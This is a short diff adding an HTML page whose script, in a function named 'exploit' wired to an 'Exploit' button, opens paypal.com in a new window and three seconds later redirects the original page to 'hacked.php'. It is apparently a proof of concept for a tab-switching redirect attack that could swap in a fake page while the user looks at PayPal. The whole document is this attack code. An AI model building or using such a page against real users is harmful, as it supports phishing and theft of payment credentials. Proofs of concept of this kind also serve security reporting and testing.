@@ -1,0 +1,10 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+function exploit() {
+  var w = window.open("https://www.paypal.com/");
+  setTimeout(function(){
+    location = "hacked.php";
+  }, 3000);
+}
+</script>
+<button onclick="exploit()">Exploit</button>
